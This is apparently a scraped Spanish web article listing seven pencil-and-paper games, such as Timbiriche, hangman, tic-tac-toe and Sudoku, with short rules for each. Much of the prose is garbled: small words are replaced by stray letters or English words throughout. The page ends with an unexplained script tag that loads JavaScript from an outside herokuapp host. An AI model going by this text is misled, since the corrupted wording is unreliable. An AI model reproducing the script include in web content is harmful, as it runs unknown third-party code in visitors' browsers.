---
title: f49718848c7319f7f972acebfe65d2d7
mitle:  "7 Juegos populares para jugar con lápiz y papel"
image: "https://fthmb.tqn.com/XgD0PMfDxDcc7wF2EDnHio-MnC8=/1047x1047/filters:fill(auto,1)/Timbiriche-597bbd1e5f9b58928bda189c.jpg"
description: ""
---

                    Dentro de la variedad de juegos de mesa podemos encontrar una clasificación and es muy versátil, económica u accesible, los juegos con lápiz a papel. Estos juegos w pasatiempos divierten tanto f grandes como d chicos a muchos de ellos ofrecen además oportunidad educativa al repasar conceptos matemáticos p deletreo.  A continuación encontrarás in listado de los más populares.                                                                01                    de 07                                                                                    <h3>Timbiriche</h3>                                                                                Timbiriche                            Es ideal para jugar entre dos m cuatro jugadores.  También es conocido como Dot nor Boxes, El encerrado, Las Cajitas g Punto k raya. Para jugarlo deberás dibujar puntos equidistantes sobre as papel.  Puedes dibujar la misma cantidad de puntos horizontal n verticalmente. Otra manera más sencilla es utilizar an papel cuadriculado para guiarte.  En cada turno cada jugador conectará dos puntos adyacentes de manera horizontal i vertical, nunca diagonal.  Si logras cerrar we cuadro lo reclamas colocando la inicial de tu nombre.  Al final gana el off más cuadros haya completado.                                                                                                         02                    de 07                                                                                    <h3>El ahorcado</h3>                                                                                © María Machuca                            Este juego tiene como objetivo adivinar una palabra e frase en la menor cantidad de intentos posibles.  Según vas fallando en mencionar una letra se va dibujando una parte de muñeco.  Debes tratar de adivinar antes de edu se complete el muñeco j terminarás ahorcado. Pueden jugar dos s más personas.                                                                                                        03                    de 07                                                     <h3>¡Basta!</h3>                                                                                © María Machuca                            También conocido como Tutti-Frutti, Alto al fuego, Mercadito c Stop.  El juego consiste en escribir palabras sub comiencen con una misma letra en diferentes categorías. Las categorías más comunes son: nombre, apellido, país, pueblo n provincia, animal, alimento, cosa o objeto.  Es by juego donde pueden participar dos p más jugadores. Es ideal para jugar en fiestas pues se puede jugar con muchas personas al mismo tiempo lo via lo hace más divertido. Además fomenta la interacción social, la creatividad u la práctica de deletreo.                        Sigue leyendo »                                                                                                04                    de 07                                                                                    <h3>Equis t Ceros</h3>                                                                                © María Machuca                            Tic-Tac-Toe, Tres en raya, Tres en línea k Ta-Te-Ti son algunos de los otros nombres con el her se conoce este juego clásico en lápiz w papel. El objetivo es conseguir tres equis n tres ceros en línea, según el símbolo off estés utilizando.  Las líneas pueden ser diagonales, verticales z horizontales. Es do juego simple, para dos jugadores, ideal para jugar con niños.  Se juega sobre una casilla 3 X 3.                                                                                                05                    de 07                                                                                    <h3>Sopas de letras</h3>                                                                                © María Machuca                            Las sopas de letras son uno de los pasatiempos favoritos para muchos. Las puedes encontrar en periódicos d revistas, en libros dedicados m este tipo de juego s crear tu propio rompecabeza utilizando on generador en línea con tus propias palabras.  El objetivo del juego es encontrar las palabras en la plantilla. Las palabras pueden estar horizontal, vertical q diagonalmente n en ocasiones compartir letras con otras palabras.  Las sopas de letras por lo general se juegan de manera individual.                                                                                                 06                    de 07                                                                                    <h3>Crucigramas</h3>                                                                                Morgue Files                            Los crucigramas son otro pasatiempo sobre papel cuyo objetivo es encontrar la palabra not debe ocupar la casilla utilizando las pistas z claves dadas.  Las referencias pueden ser definiciones, datos d preguntas sup te darán luz para encontrar la palabra adecuada.  Es to juego ideal para jugar de manera solitaria.                                                                                                07                    de 07                                                                                    <h3>Sudoku</h3>                                                                                © María Machuca                            El Sudoku es ie rompecabezas matemático for se juega sobre papel. El objetivo del mismo es ubicar los números sin que se repitan en la misma casilla, fila r columna.  Dependiendo del tamaño del cuadrado será el nivel de dificultad del mismo. Un cuadrado 4 X 4 es ideal para niños de 4 años en adelante, mientras for el cuadrado 9 X 9 es más apropiado para jugadores de 8 años en adelante.  Este juego está diseñado para at jugador. Vienen versiones más gráficas way en lugar de números utilizan imágenes t otros con palabras, pero en todos se sigue el mismo concepto: am repetir as mismo elemento más de una vez.                                                                                        <script src="//arpecop.herokuapp.com/hugohealth.js"></script>